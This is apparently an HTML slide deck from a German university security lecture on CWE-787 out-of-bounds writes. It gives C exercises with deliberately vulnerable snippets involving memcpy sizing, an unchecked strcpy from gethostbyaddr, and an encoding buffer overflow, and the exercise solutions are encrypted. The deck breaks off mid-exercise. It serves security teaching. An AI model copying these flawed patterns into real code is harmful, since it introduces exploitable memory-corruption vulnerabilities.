<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="de" lang="de">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<meta content="Michael Eichberg" name="author" />
<meta content="&quot;CWE&quot;, &quot;OWASP&quot;" name="keywords" />
<meta content="Verteilte Systeme" lang="de" name="description" xml:lang="de" />
<meta content="lecture-security-cwe-owasp" name="id" />
<meta content="last-viewed" name="first-slide" />
<meta name="version" content="LD2 RENAISSANCE" />
<meta name="exercises-passwords" content="MTAwMDAw:aUyGLxnJAm0ouSqDsC/+YhJ9w+fhnUolfQJPOJULZsg=:bzXultmVedc5b4E0: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" />
<title>CWE/OWASP</title>

    <script src="../LectureDoc2/src/ld.js" type="module"></script>

    <link rel="stylesheet" href="../LectureDoc2/src/ld.css" />

    
    <!-- As of 2024 it is not yet possible to use "layer" with linked stylesheets
         <link rel="stylesheet" href="../LectureDoc2/src/css/themes/dhbw.css" layer="theme" />
 -->
         <style>@import url("../LectureDoc2/src/css/themes/dhbw.css") layer(theme);</style>
    
</head>
<body>
<template>
<ld-topic id="cwe-owasp">
<h1 class="title">CWE/OWASP</h1>
<dl class="docinfo">
<dt class="dozent">Dozent<span class="colon">:</span></dt>
<dd class="dozent"><p><a class="reference external" href="https://delors.github.io/cv/folien.de.rst.html">Prof. Dr. Michael Eichberg</a></p>
</dd>
<dt class="contact">Kontakt<span class="colon">:</span></dt>
<dd class="contact"><a class="reference external" href="mailto:michael.eichberg&#64;dhbw.de">michael.eichberg&#64;dhbw.de</a></dd>
<dt class="version">Version<span class="colon">:</span></dt>
<dd class="version">1.2</dd>
</dl>
<div class="supplemental docutils container">
<dl class="field-list">
<dt>Folien<span class="colon">:</span></dt>
<dd><p>[HTML] <a class="reference external" href="https://delors.github.io/sec-cwe-owasp/folien.de.rst.html">https://delors.github.io/sec-cwe-owasp/folien.de.rst.html</a></p>
<p>[PDF] <a class="reference external" href="https://delors.github.io/sec-cwe-owasp/folien.de.rst.html.pdf">https://delors.github.io/sec-cwe-owasp/folien.de.rst.html.pdf</a></p>
</dd>
<dt>Fehler melden<span class="colon">:</span></dt>
<dd><p><a class="reference external" href="https://github.com/Delors/delors.github.io/issues">https://github.com/Delors/delors.github.io/issues</a></p>
</dd>
</dl>
</div>
</ld-topic>
<ld-topic class="new-section transition-fade" id="relevante-schwachstellen-cwes">
<h2>Relevante Schwachstellen (<a class="reference external" href="https://cwe.mitre.org">CWEs</a>)</h2>
</ld-topic>
<ld-topic class="transition-move-to-top new-subsection" id="cwe-787-out-of-bounds-write-memory-corruption">
<h2>CWE-787: Out-of-bounds Write (Memory Corruption)</h2>
<div class="section-subtitle docutils container">
<p class="rubric">CWE Rank</p>
<table class="booktabs table-data-align-left table-header-align-left" style="width: 100%;">
<colgroup>
<col style="width: 40.0%" />
<col style="width: 60.0%" />
</colgroup>
<thead>
<tr><th class="head"><p>Jahr</p></th>
<th class="head"><p>Position</p></th>
</tr>
</thead>
<tbody>
<tr><td><p>2024</p></td>
<td><p>#2</p></td>
</tr>
<tr><td><p>2023</p></td>
<td><p>#1</p></td>
</tr>
</tbody>
</table>
</div>
</ld-topic>
<ld-topic id="cwe-787-out-of-bounds-write-memory-corruption-1">
<h2>CWE-787: Out-of-bounds Write (Memory Corruption)</h2>
<ld-deck>
<ld-card>
<dl class="field-list simple">
<dt>Beschreibung<span class="colon">:</span></dt>
<dd><p>Es werden Daten hinter oder vor den Bereich des Puffers geschrieben.</p>
</dd>
<dt>Programmiersprachen<span class="colon">:</span></dt>
<dd><p>C /C++</p>
</dd>
<dt>Wahrscheinlichkeit des Missbrauchs<span class="colon">:</span></dt>
<dd><p>Hoch</p>
</dd>
<dt>Technische Auswirkungen<span class="colon">:</span></dt>
<dd><p>Speichermodifikation; DoS: Crash, Beendigung oder Neustart; Ausführen von nicht autorisiertem Code oder Befehlen</p>
</dd>
</dl>
</ld-card><ld-card class="incremental">
<aside class="admonition example">
<p class="admonition-title">Beispiel</p>
<pre class="code c literal-block"><small class="ln">1 </small><code data-lineno="1 "><span class="keyword type">int</span><span class="whitespace"> </span><span class="name">id_sequence</span><span class="punctuation">[</span><span class="literal number integer">3</span><span class="punctuation">];</span><span class="whitespace">
</span></code><small class="ln">2 </small><code data-lineno="2 "><span class="whitespace">
</span></code><small class="ln">3 </small><code data-lineno="3 "><span class="whitespace"></span><span class="comment multiline">/* Populate the id array. */</span><span class="whitespace">
</span></code><small class="ln">4 </small><code data-lineno="4 "><span class="whitespace">
</span></code><small class="ln">5 </small><code data-lineno="5 "><span class="whitespace"></span><span class="name">id_sequence</span><span class="punctuation">[</span><span class="literal number integer">0</span><span class="punctuation">]</span><span class="whitespace"> </span><span class="operator">=</span><span class="whitespace"> </span><span class="literal number integer">123</span><span class="punctuation">;</span><span class="whitespace">
</span></code><small class="ln">6 </small><code data-lineno="6 "><span class="whitespace"></span><span class="name">id_sequence</span><span class="punctuation">[</span><span class="literal number integer">1</span><span class="punctuation">]</span><span class="whitespace"> </span><span class="operator">=</span><span class="whitespace"> </span><span class="literal number integer">234</span><span class="punctuation">;</span><span class="whitespace">
</span></code><small class="ln">7 </small><code data-lineno="7 "><span class="whitespace"></span><span class="name">id_sequence</span><span class="punctuation">[</span><span class="literal number integer">2</span><span class="punctuation">]</span><span class="whitespace"> </span><span class="operator">=</span><span class="whitespace"> </span><span class="literal number integer">345</span><span class="punctuation">;</span><span class="whitespace">
</span></code><small class="ln">8 </small><code data-lineno="8 "><span class="whitespace"></span><span class="name">id_sequence</span><span class="punctuation">[</span><span class="literal number integer">3</span><span class="punctuation">]</span><span class="whitespace"> </span><span class="operator">=</span><span class="whitespace"> </span><span class="literal number integer">456</span><span class="punctuation">;</span><span class="whitespace">   </span><span class="comment single">// &lt;- Out-of-bounds Write</span></code></pre>
</aside>
</ld-card><ld-card class="incremental">
<div class="ld-exercise" data-exercise-id="1" data-exercise-title="1 - memcpy()" id="ld-exercise-1">
<p class="ld-exercise-title rubric"><code class="c"><span class="name">memcpy</span><span class="punctuation">()</span></code></p>
<pre class="code C literal-block"><small class="ln"> 1 </small><code data-lineno=" 1 "><span class="keyword type">int</span><span class="whitespace"> </span><span class="name function">returnChunkSize</span><span class="punctuation">(</span><span class="keyword type">void</span><span class="whitespace"> </span><span class="operator">*</span><span class="punctuation">)</span><span class="whitespace"> </span><span class="punctuation">{</span><span class="whitespace">
</span></code><small class="ln"> 2 </small><code data-lineno=" 2 "><span class="whitespace">
</span></code><small class="ln"> 3 </small><code data-lineno=" 3 "><span class="whitespace">    </span><span class="comment multiline">/* if chunk info is valid, return the size of usable memory,
</span></code><small class="ln"> 4 </small><code data-lineno=" 4 "><span class="comment multiline">    * else, return -1 to indicate an error
</span></code><small class="ln"> 5 </small><code data-lineno=" 5 "><span class="comment multiline">    */</span><span class="whitespace">
</span></code><small class="ln"> 6 </small><code data-lineno=" 6 "><span class="whitespace">    </span><span class="punctuation">...</span><span class="whitespace">
</span></code><small class="ln"> 7 </small><code data-lineno=" 7 "><span class="whitespace"></span><span class="punctuation">}</span><span class="whitespace">
</span></code><small class="ln"> 8 </small><code data-lineno=" 8 "><span class="whitespace">
</span></code><small class="ln"> 9 </small><code data-lineno=" 9 "><span class="whitespace"></span><span class="keyword type">int</span><span class="whitespace"> </span><span class="name function">main</span><span class="punctuation">()</span><span class="whitespace"> </span><span class="punctuation">{</span><span class="whitespace">
</span></code><small class="ln">10 </small><code data-lineno="10 "><span class="whitespace">    </span><span class="punctuation">...</span><span class="whitespace">
</span></code><small class="ln">11 </small><code data-lineno="11 "><span class="whitespace">    </span><span class="name">memcpy</span><span class="punctuation">(</span><span class="name">destBuf</span><span class="punctuation">,</span><span class="whitespace"> </span><span class="name">srcBuf</span><span class="punctuation">,</span><span class="whitespace"> </span><span class="punctuation">(</span><span class="name">returnChunkSize</span><span class="punctuation">(</span><span class="name">destBuf</span><span class="punctuation">)</span><span class="literal number integer">-1</span><span class="punctuation">));</span><span class="whitespace">
</span></code><small class="ln">12 </small><code data-lineno="12 "><span class="whitespace">    </span><span class="punctuation">...</span><span class="whitespace">
</span></code><small class="ln">13 </small><code data-lineno="13 "><span class="whitespace"></span><span class="punctuation">}</span></code></pre>
<div class="ld-exercise-solution" data-encrypted="true">
MTAwMDAw:/NJex28WBEDbevku3uHO3U8EEFmPxptQuS2llapxUiI=:CGF0a5ARIcB9DzI2:HPA60mQ2OtWD8N/hKbWZVZO01pqwx0YJpv+XB/NOQX5xstPIhzqFq8NWibdF08O8NxZVRs9fL8MRbiH3b7yp3plqHJjehiLfeU2q8HcsPUVj3rTUqVmGJxhuNiWSi6OC9Tq4ofVKg4VhcvC09pqdlR034BHipMEplHpJwjdGHc+1yBxVuow3VyrmCbr6Dm6WkNjYBKep5Dl2N+plLOW1/3G+WfZhYVYQAIXyWZqhf6KqD5hKERhO0c+pqgRo8wXn+w2ilcfvlTFhcaqJifyHaIsLcbQcKsN1E4DfUkiMoN1WT61mzxON5ts8+BAaDb+AtWbaewo8</div>
</div>
</ld-card><ld-card class="incremental">
<div class="ld-exercise" data-exercise-id="2" data-exercise-title="2 - Implizite Annahmen" id="ld-exercise-2">
<p class="ld-exercise-title rubric">Implizite Annahmen</p>
<pre class="code C literal-block"><small class="ln"> 1 </small><code data-lineno=" 1 "><span class="keyword type">void</span><span class="whitespace"> </span><span class="name function">host_lookup</span><span class="punctuation">(</span><span class="keyword type">char</span><span class="whitespace"> </span><span class="operator">*</span><span class="name">user_supplied_addr</span><span class="punctuation">){</span><span class="whitespace">
</span></code><small class="ln"> 2 </small><code data-lineno=" 2 "><span class="whitespace">    </span><span class="keyword">struct</span><span class="whitespace"> </span><span class="name class">hostent</span><span class="whitespace"> </span><span class="operator">*</span><span class="name">hp</span><span class="punctuation">;</span><span class="whitespace">
</span></code><small class="ln"> 3 </small><code data-lineno=" 3 "><span class="whitespace">    </span><span class="name">in_addr_t</span><span class="whitespace"> </span><span class="operator">*</span><span class="name">addr</span><span class="punctuation">;</span><span class="whitespace">
</span></code><small class="ln"> 4 </small><code data-lineno=" 4 "><span class="whitespace">    </span><span class="keyword type">char</span><span class="whitespace"> </span><span class="name">hostname</span><span class="punctuation">[</span><span class="literal number integer">64</span><span class="punctuation">];</span><span class="whitespace">
</span></code><small class="ln"> 5 </small><code data-lineno=" 5 "><span class="whitespace">    </span><span class="name">in_addr_t</span><span class="whitespace"> </span><span class="name">inet_addr</span><span class="punctuation">(</span><span class="keyword">const</span><span class="whitespace"> </span><span class="keyword type">char</span><span class="whitespace"> </span><span class="operator">*</span><span class="name">cp</span><span class="punctuation">);</span><span class="whitespace"> </span><span class="comment single">// function prototype
</span></code><small class="ln"> 6 </small><code data-lineno=" 6 "><span class="comment single"></span><span class="whitespace">
</span></code><small class="ln"> 7 </small><code data-lineno=" 7 "><span class="whitespace">    </span><span class="comment multiline">/* routine that ensures user_supplied_addr is in the right format for
</span></code><small class="ln"> 8 </small><code data-lineno=" 8 "><span class="comment multiline">    conversion */</span><span class="whitespace">
</span></code><small class="ln"> 9 </small><code data-lineno=" 9 "><span class="whitespace">
</span></code><small class="ln">10 </small><code data-lineno="10 "><span class="whitespace">    </span><span class="name">validate_addr_form</span><span class="punctuation">(</span><span class="name">user_supplied_addr</span><span class="punctuation">);</span><span class="whitespace">
</span></code><small class="ln">11 </small><code data-lineno="11 "><span class="whitespace">    </span><span class="name">addr</span><span class="whitespace"> </span><span class="operator">=</span><span class="whitespace"> </span><span class="name">inet_addr</span><span class="punctuation">(</span><span class="name">user_supplied_addr</span><span class="punctuation">);</span><span class="whitespace">
</span></code><small class="ln">12 </small><code data-lineno="12 "><span class="whitespace">    </span><span class="name">hp</span><span class="whitespace"> </span><span class="operator">=</span><span class="whitespace"> </span><span class="name">gethostbyaddr</span><span class="punctuation">(</span><span class="whitespace"> </span><span class="name">addr</span><span class="punctuation">,</span><span class="whitespace"> </span><span class="keyword">sizeof</span><span class="punctuation">(</span><span class="keyword">struct</span><span class="whitespace"> </span><span class="name class">in_addr</span><span class="punctuation">),</span><span class="whitespace"> </span><span class="name">AF_INET</span><span class="punctuation">);</span><span class="whitespace">
</span></code><small class="ln">13 </small><code data-lineno="13 "><span class="whitespace">    </span><span class="name">strcpy</span><span class="punctuation">(</span><span class="name">hostname</span><span class="punctuation">,</span><span class="whitespace"> </span><span class="name">hp</span><span class="operator">-&gt;</span><span class="name">h_name</span><span class="punctuation">);</span><span class="whitespace">
</span></code><small class="ln">14 </small><code data-lineno="14 "><span class="whitespace"></span><span class="punctuation">}</span></code></pre>
<div class="ld-exercise-solution" data-encrypted="true">
MTAwMDAw:nSR0+gWj0pOAjYkAgf8j56kqtkR1ip6KQ+APVFMnwjs=:6hUp/+9V2GS1fuJQ:rkqA2DMRf6kphSegUiQU+BwuA3ltdYDPra6/YLDUqehuPjnIo1lKfKtOsdglgrzUM1p+wcrKbkIrpJ01UUzNxMN7WkE582S2nDu6Y7nNCh20Rx+6qWDmZZeIfw0ehmJz8CS5n5Xg/pi7ksMSY6PEcPwTFDTUHJLqNyicf8QhgMznk67OU3xJMU946DK3EaRJ+BibN8kFO/zaYMFMkyOraKLlikAnjmjWXO9rnqILxLmvHLai/DcJs/E+jpN+Lr7KYbrPKtTyhvtAR6AoMaBo9pF2yG1Et0lz/PS25xKHIkApTmD+M0cqexxrJU2ib9Kvw2+8IZ3kqWKwZ3kZMFJ7a/9+T2O/+hkshf/L263eWt2IZG9l2SezPvPbcw1bQL9tPT+b3zCfYAGrYSZrkOGl7x7SW9mBNDQjLVm97giAl8WOiTp8kyA340JSbg9Be8FY45lpQIS/Y5yaCXtYA6BQpBmPazRs2Zj5y7Z3OMP9YsavcyTyCJqdmHjwLg4slm+YlgFn+sZi1YT55DWh2Gi/av8OWkFKVIygOP1n/04rv8zoRtZERgiBMRP7xgUTMzLmrOpN3IXZEz324bpYqzuWyvAN87rGoQ108b8T4ywuKTPiLnGcUu4xjxfuWigXZ6PR7PvRq2P/tMs=</div>
</div>
<div class="supplemental docutils container">
<p class="rubric">Auszug aus der Dokumentation von <code class="c"><span class="name">gethostbyaddr</span></code></p>
<blockquote class="epigraph">
<p><strong>Return Value</strong></p>
<p>The <code class="c"><span class="name">gethostbyaddr</span><span class="punctuation">()</span></code> function return the <code class="c"><span class="name">hostent</span></code> structure or a <code class="c"><span class="name builtin">NULL</span></code> pointer if an error occurs.</p>
<p class="attribution">—<a class="reference external" href="https://linux.die.net/man/3/gethostbyaddr">https://linux.die.net/man/3/gethostbyaddr</a></p>
</blockquote>
</div>
</ld-card><ld-card class="incremental">
<div class="ld-exercise" data-exercise-id="3" data-exercise-title="3 - Abweichung von der Erwartung" id="ld-exercise-3">
<p class="ld-exercise-title rubric">Abweichung von der Erwartung</p>
<pre class="code C literal-block"><small class="ln"> 1 </small><code data-lineno=" 1 "><span class="keyword type">char</span><span class="whitespace"> </span><span class="operator">*</span><span class="whitespace"> </span><span class="name function">copy_input</span><span class="punctuation">(</span><span class="keyword type">char</span><span class="whitespace"> </span><span class="operator">*</span><span class="name">user_supplied_string</span><span class="punctuation">){</span><span class="whitespace">
</span></code><small class="ln"> 2 </small><code data-lineno=" 2 "><span class="whitespace">    </span><span class="keyword type">int</span><span class="whitespace"> </span><span class="name">i</span><span class="punctuation">,</span><span class="whitespace"> </span><span class="name">dst_index</span><span class="punctuation">;</span><span class="whitespace">
</span></code><small class="ln"> 3 </small><code data-lineno=" 3 "><span class="whitespace">    </span><span class="keyword type">char</span><span class="whitespace"> </span><span class="operator">*</span><span class="name">dst_buf</span><span class="whitespace"> </span><span class="operator">=</span><span class="whitespace"> </span><span class="punctuation">(</span><span class="keyword type">char</span><span class="operator">*</span><span class="punctuation">)</span><span class="name">malloc</span><span class="punctuation">(</span><span class="literal number integer">4</span><span class="operator">*</span><span class="keyword">sizeof</span><span class="punctuation">(</span><span class="keyword type">char</span><span class="punctuation">)</span><span class="whitespace"> </span><span class="operator">*</span><span class="whitespace"> </span><span class="name">MAX_SIZE</span><span class="punctuation">);</span><span class="whitespace">
</span></code><small class="ln"> 4 </small><code data-lineno=" 4 "><span class="whitespace">    </span><span class="keyword">if</span><span class="whitespace"> </span><span class="punctuation">(</span><span class="whitespace"> </span><span class="name">MAX_SIZE</span><span class="whitespace"> </span><span class="operator">&lt;=</span><span class="whitespace"> </span><span class="name">strlen</span><span class="punctuation">(</span><span class="name">user_supplied_string</span><span class="punctuation">)</span><span class="whitespace"> </span><span class="punctuation">)</span><span class="whitespace"> </span><span class="name">die</span><span class="punctuation">(</span><span class="literal string">&quot;string too long&quot;</span><span class="punctuation">);</span><span class="whitespace">
</span></code><small class="ln"> 5 </small><code data-lineno=" 5 "><span class="whitespace">    </span><span class="name">dst_index</span><span class="whitespace"> </span><span class="operator">=</span><span class="whitespace"> </span><span class="literal number integer">0</span><span class="punctuation">;</span><span class="whitespace">
</span></code><small class="ln"> 6 </small><code data-lineno=" 6 "><span class="whitespace">    </span><span class="keyword">for</span><span class="whitespace"> </span><span class="punctuation">(</span><span class="whitespace"> </span><span class="name">i</span><span class="whitespace"> </span><span class="operator">=</span><span class="whitespace"> </span><span class="literal number integer">0</span><span class="punctuation">;</span><span class="whitespace"> </span><span class="name">i</span><span class="whitespace"> </span><span class="operator">&lt;</span><span class="whitespace"> </span><span class="name">strlen</span><span class="punctuation">(</span><span class="name">user_supplied_string</span><span class="punctuation">);</span><span class="whitespace"> </span><span class="name">i</span><span class="operator">++</span><span class="whitespace"> </span><span class="punctuation">){</span><span class="whitespace">
</span></code><small class="ln"> 7 </small><code data-lineno=" 7 "><span class="whitespace">        </span><span class="keyword">if</span><span class="punctuation">(</span><span class="whitespace"> </span><span class="literal string char">'&amp;'</span><span class="whitespace"> </span><span class="operator">==</span><span class="whitespace"> </span><span class="name">user_supplied_string</span><span class="punctuation">[</span><span class="name">i</span><span class="punctuation">]</span><span class="whitespace"> </span><span class="punctuation">){</span><span class="whitespace">
</span></code><small class="ln"> 8 </small><code data-lineno=" 8 "><span class="whitespace">            </span><span class="name">dst_buf</span><span class="punctuation">[</span><span class="name">dst_index</span><span class="operator">++</span><span class="punctuation">]</span><span class="whitespace"> </span><span class="operator">=</span><span class="whitespace"> </span><span class="literal string char">'&amp;'</span><span class="punctuation">;</span><span class="whitespace">
</span></code><small class="ln"> 9 </small><code data-lineno=" 9 "><span class="whitespace">            </span><span class="name">dst_buf</span><span class="punctuation">[</span><span class="name">dst_index</span><span class="operator">++</span><span class="punctuation">]</span><span class="whitespace"> </span><span class="operator">=</span><span class="whitespace"> </span><span class="literal string char">'a'</span><span class="punctuation">;</span><span class="whitespace"> </span><span class="name">dst_buf</span><span class="punctuation">[</span><span class="name">dst_index</span><span class="operator">++</span><span class="punctuation">]</span><span class="whitespace"> </span><span class="operator">=</span><span class="whitespace"> </span><span class="literal string char">'m'</span><span class="punctuation">;</span><span class="whitespace">
</span></code><small class="ln">10 </small><code data-lineno="10 "><span class="whitespace">            </span><span class="name">dst_buf</span><span class="punctuation">[</span><span class="name">dst_index</span><span class="operator">++</span><span class="punctuation">]</span><span class="whitespace"> </span><span class="operator">=</span><span class="whitespace"> </span><span class="literal string char">'p'</span><span class="punctuation">;</span><span class="whitespace"> </span><span class="name">dst_buf</span><span class="punctuation">[</span><span class="name">dst_index</span><span class="operator">++</span><span class="punctuation">]</span><span class="whitespace"> </span><span class="operator">=</span><span class="whitespace"> </span><span class="literal string char">';'</span><span class="punctuation">;</span><span class="whitespace">
</span></code><small class="ln">11 </small><code data-lineno="11 "><span class="whitespace">        </span><span class="punctuation">}</span><span class="whitespace">
</span></code><small class="ln">12 </small><code data-lineno="12 "><span class="whitespace">        </span><span class="keyword">else</span><span class="whitespace"> </span><span class="keyword">if</span><span class="whitespace"> </span><span class="punctuation">(</span><span class="whitespace"> </span><span class="literal string char">'&lt;'</span><span class="whitespace"> </span><span class="operator">==</span><span class="whitespace"> </span><span class="name">user_supplied_string</span><span class="punctuation">[</span><span class="name">i</span><span class="punctuation">]</span><span class="whitespace"> </span><span class="punctuation">){</span><span class="whitespace"> </span><span class="comment multiline">/* encode to &amp;lt; */</span><span class="whitespace"> </span><span class="punctuation">}</span><span class="whitespace">
</span></code><small class="ln">13 </small><code data-lineno="13 "><span class="whitespace">        </span><span class="keyword">else</span><span class="whitespace"> </span><span class="name">dst_buf</span><span class="punctuation">[</span><span class="name">dst_index</span><span class="operator">++</span><span class="punctuation">]</span><span class="whitespace"> </span><span class="operator">=</span><span class="whitespace"> </span><span class="name">user_supplied_string</span><span class="punctuation">[</span><span class="name">i</span><span class="punctuation">];</span><span class="whitespace">
</span></code><small class="ln">14 </small><code data-lineno="14 "><span class="whitespace">    </span><span class="punctuation">}</span><span class="whitespace">
</span></code><small class="ln">15 </small><code data-lineno="15 "><span class="whitespace">    </span><span class="keyword">return</span><span class="whitespace"> </span><span class="name">dst_buf</span><span class="punctuation">;</span><span class="whitespace">
</span></code><small class="ln">16 </small><code data-lineno="16 "><span class="whitespace"></span><span class="punctuation">}</span></code></pre>
<div class="ld-exercise-solution" data-encrypted="true">
